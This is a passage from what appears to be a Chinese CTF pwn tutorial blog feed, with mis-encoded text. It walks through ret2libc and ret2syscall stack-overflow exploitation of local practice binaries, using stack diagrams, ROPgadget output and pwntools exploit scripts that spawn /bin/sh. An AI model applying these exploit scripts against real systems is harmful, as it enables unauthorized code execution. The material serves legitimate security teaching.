class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |     b<span class="string">&#x27;bbbb&#x27;</span>     |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       |</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              sèµ·å§‹,ebp-108--&gt;+-----------------+  </span><br><span class="line"><span class="comment"># ä¸ºä»€ä¹ˆè¦å¡«å……&#x27;bbbb&#x27;ï¼Œä¸ºäº†æ ˆå¹³è¡¡ã€‚local var åæ¥ ebp å†åæ¥ ret_addr</span></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    | systemè¦ä¼ å…¥çš„å‚æ•°<span class="string">&#x27;/bin/sh&#x27;</span>            </span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                   ret_addr  |       ebp       | systemä¸­çš„æ±‡ç¼–æŒ‡ä»¤push ebp</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       | å«çˆ¶å‡½æ•°ebpä¿¡æ¯çš„ebp</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              sèµ·å§‹,ebp-108--&gt;+-----------------+ </span><br><span class="line"><span class="comment"># è¿”å›åˆ°systemåœ°å€åè°ƒç”¨systemï¼Œsystemä¸­æœ‰æ±‡ç¼–æŒ‡ä»¤push ebpï¼Œå¯ä»¥çœ‹åˆ°push ebp äº§ç”Ÿäº†åˆä¸€ä¸ªebpå‹å…¥æ ˆä¸­ï¼Œåœ¨è¿™é‡Œæ²¡ä»€ä¹ˆç”¨å¯ä»¥ç”¨åƒåœ¾æ•°æ®paddingï¼Œæ•…&#x27;/bin/sh&#x27; ç§»åˆ°sys_aadrçš„ä¸Šé¢ä¸¤ä¸ªå­—é•¿</span></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    | systemè¦ä¼ å…¥çš„å‚æ•°<span class="string">&#x27;/bin/sh&#x27;</span>        </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       | å«çˆ¶å‡½æ•°ebpä¿¡æ¯çš„ebp</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              sèµ·å§‹,ebp-108--&gt;+-----------------+ </span><br><span class="line"><span class="comment">#ã€€è‹¥ç›´æ¥åœ¨systemåé¢ç´§è·Ÿå‚æ•°&#x27;/bin/sh&#x27;ï¼Œåˆ™push ebpæ—¶äº§ç”Ÿçš„ebpä¼šå°†å‚æ•°&#x27;/bin/sh&#x27;çš„åœ°å€è¦†ç›–æ‰ï¼Œæ•…ä¸ºäº†æ ˆå¹³è¡¡ï¼Œæˆ‘ä»¬è¦å°†å‚æ•°&#x27;/bin/sh&#x27;çš„åœ°å€ä¸Šç§»ä¸¤ä¸ªå­—é•¿  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">sys_addr = <span class="number">0x08048460</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(sys_addr)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span>+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp3ç»ˆæç‰ˆ</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment"># æ›¿ä»£idaè¿›è¡Œé™æ€åˆ†æ</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹systemå‡½æ•°çš„pltåœ°å€ï¼Œè¾“å‡ºåè¿›åˆ¶åœ°å€ï¼Œå¯ä»¥åŠ hex()è½¬æ¢æˆåå…­è¿›åˆ¶</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># æŸ¥çœ‹&#x27;/bin/sh&#x27;å­—ç¬¦ä¸²åœ°å€(å‰é¢è¦åŠ b)ï¼Œè¾“å‡ºåè¿›åˆ¶åœ°å€ï¼Œå¯ä»¥åŠ hex()è½¬æ¢æˆåå…­è¿›åˆ¶</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># p32()å°†åœ°å€æ‰“åŒ…æˆäºŒè¿›åˆ¶ï¼Œä¸ç®¡æ˜¯åå…­è¿›åˆ¶è¿˜æ˜¯åè¿›åˆ¶</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>, p32(sys_addr), <span class="string">b&#x27;bbbb&#x27;</span>, p32(bin_sh)])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>å¯èƒ½é‡åˆ°çš„é—®é¢˜</h3><p><strong>Q1: ä¸ºä»€ä¹ˆè§åˆ°æœ‰äº›payloadæ˜¯æ²¡æœ‰ä¸ºsystemå‡½æ•°ä¼ åƒâ€™aâ€™*4è¿™æ ·çš„å‡½æ•°è¿”å›åœ°å€å‚æ•°å‘¢ï¼Ÿ</strong></p><p>Aï¼šå› ä¸ºç›´æ¥è°ƒç”¨ call _system æ—¶ï¼Œæ ¹æ®callå‘½ä»¤çš„åŠŸèƒ½ï¼Œå®ƒä¼šå…ˆæŠŠè¿”å›åœ°å€å‹å…¥æ ˆï¼Œå†è·³è½¬åˆ°æŒ‡å®šå‡½æ•°ï¼ˆå³pltçš„ä½ç½®ï¼‰ï¼Œè€Œç›´æ¥è°ƒç”¨pltå¤„çš„å‡½æ•°æ˜¯æ²¡æœ‰å‹å…¥è¿”å›åœ°å€å‚æ•°è¿™ä¸€æ­¥éª¤çš„ï¼Œæ•…å¯è®¤ä¸ºâ€™bâ€™ * 4å¡«å……çš„ä¸ºè™šæ‹Ÿåœ°å€ã€‚</p><p><strong>Q2: exp.pyæŠ¥é”™ï¼Ÿ</strong></p><p>Aï¼šåœ¨å¡«å……å­—ç¬¦å‰åŠ bï¼Œå¦‚exp2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ret2libc&quot;&gt;&lt;a href=&quot;#ret2libc&quot; class=&quot;headerlink&quot; title=&quot;ret2libc&quot;&gt;&lt;/a&gt;ret2libc&lt;/h2&gt;&lt;p&gt;ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="https://pwnling.github.io/2022/12/03/6-ret2syscall/"/>
    <id>https://pwnling.github.io/2022/12/03/6-ret2syscall/</id>
    <published>2022-12-03T14:00:00.000Z</published>
    <updated>2022-12-03T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shell</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><p>æºç¨‹åºä¸º 32 ä½ï¼Œå¼€å¯äº† NX ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ checksec rop</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/æ¡Œé¢/pwn3æ–‡ä»¶/rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>ç›´æ¥F5åæ±‡ç¼–ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="step4-ç³»ç»Ÿè°ƒç”¨"><a href="#step4-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="step4 ç³»ç»Ÿè°ƒç”¨"></a>step4 ç³»ç»Ÿè°ƒç”¨</h3><p>ç”±äºå¼€å¯äº†NXï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgetsï¼ˆå°ç‰‡æ®µï¼‰ç»„åˆæˆROPï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å…³äºç³»ç»Ÿè°ƒç”¨çš„çŸ¥è¯†ï¼š</span><br><span class="line">Linux çš„32ä½ç³»ç»Ÿè°ƒç”¨é€šè¿‡ int 80h ï¼ˆint 0x80ï¼‰å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·æ¥åŒºåˆ†å…¥å£å‡½æ•°</span><br><span class="line"></span><br><span class="line">åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æ˜¯ï¼š</span><br><span class="line">1ã€æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥ EAX</span><br><span class="line">2ã€æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶å®ƒé€šç”¨å¯„å­˜å™¨</span><br><span class="line">3ã€è§¦å‘ 0x80 å·ä¸­æ–­ï¼ˆint 0x80ï¼‰</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å– shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.eax=0xb</span><br><span class="line">2.ebx=/bin/sh çš„åœ°å€</span><br><span class="line">  ecx=0</span><br><span class="line">  edx=0</span><br><span class="line">3.è§¦å‘int 0x80</span><br></pre></td></tr></table></figure><h4 id="1-æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨å·"><a href="#1-æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="1.æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨å·"></a>1.æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨å·</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>(å‘½ä»¤)ï¼š<span class="built_in">cat</span> /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ <span class="built_in">cat</span> /usr/include/asm/unistd_32.h | grep execve</span><br><span class="line"><span class="comment">#define __NR_execve 11</span></span><br><span class="line"><span class="comment">#define __NR_execveat 358</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“ç³»ç»Ÿè°ƒç”¨å·ä¸º 11ï¼Œè½¬æ¢ä¸º 16 è¿›åˆ¶æ˜¯ 0xbï¼Œæ‰€ä»¥ eax ä¸­åº”è¯¥å­˜æ”¾ <strong>0xb</strong></p><h4 id="2-å¯„å­˜å™¨ä¼ å‚"><a href="#2-å¯„å­˜å™¨ä¼ å‚" class="headerlink" title="2.å¯„å­˜å™¨ä¼ å‚"></a>2.å¯„å­˜å™¨ä¼ å‚</h4><p>æŸ¥æ‰¾å¯„å­˜å™¨eax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commandï¼šROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p><strong>pop_eax_ret = 0x080bb196</strong></p><p>åŒæ ·ç”¨æ­¤å‘½ä»¤æŸ¥æ‰¾å…¶ä»–å¯„å­˜å™¨ï¼šEBX ECX EDXï¼Œå³å°†EAXæ¢æˆä¸Šè¿°å¯„å­˜å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret//<span class="comment">#########å®šä½#########</span></span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>ç”±äºå…¶ä¸­ä¸€æ®µåœ°å€å¯ä»¥æ§åˆ¶3ä¸ªå¯„å­˜å™¨ï¼Œæ•…ç›´æ¥ä½¿ç”¨è¯¥åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p><strong>pop_edx_ecx_ebx_ret = 0x0806eb90</strong></p><h4 id="3-int-0x80"><a href="#3-int-0x80" class="headerlink" title="3.int 0x80"></a>3.int 0x80</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commmandï¼šROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p><strong>int_0x80 = 0x08049421</strong></p><h4 id="4-bin-sh"><a href="#4-bin-sh" class="headerlink" title="4./bin/sh"></a>4./bin/sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>ï¼šROPgadget --binary rop  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn3æ–‡ä»¶$ ROPgadget --binary rop  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p><strong>binsh = 0x80be408</strong>ï¼Œæ˜¯ â€˜/bin/shâ€™ ï¼Œä¸æ˜¯ â€˜bin/shâ€™ï¼Œé”™è¯¯ç¤ºèŒƒå¦‚ä¸‹ï¼Œå¯¼è‡´è¿”å›åœ°å€é”™è¯¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROP$ ROPgadget --binary ret2syscall --string <span class="string">&#x27;bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be409 : bin/sh</span><br></pre></td></tr></table></figure><h3 id="step5-exp"><a href="#step5-exp" class="headerlink" title="step5 exp"></a>step5 exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                             +-----------------+</span><br><span class="line">                             |   int_0x80      | </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;bin/sh&#x27;</span>     |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |        0        |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |        0        |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |  pop_other_ret  |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       0xb       |  </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   pop_eax_ret   | </span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        v4       |</span><br><span class="line">            v4èµ·å§‹,ebp-0x6C--&gt;+-----------------+  </span><br><span class="line"><span class="comment"># pop_other_ret = pop_edx_ecx_ebx_retï¼Œä¼ å‚é¡ºåºä¸ºedx--&gt;ecx--&gt;ebx</span></span><br><span class="line"><span class="comment"># è°ƒç”¨äº†gets()å‡½æ•°ï¼Œå¾…ä¼šè¦è¿”å›main()ï¼Œæ•…pop_eax_retå‰æœ‰ä¸ªæ–°çš„ebpï¼Œè¦å¡«å……4å­—èŠ‚è¦†ç›–ã€‚è€Œå…¶ä»–çš„pop_retåªæ˜¯gadgetï¼Œä¸ç”¨åœ¨å…¶å‰é¢åŠ ebpæ¥å¡«å……4å­—èŠ‚</span></span><br><span class="line"><span class="comment"># ç”±äºROPæ˜¯è¿ç»­çš„gadgetï¼Œæ•…è§†å›¾å¦‚ä¸Š</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å†™æ³•1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 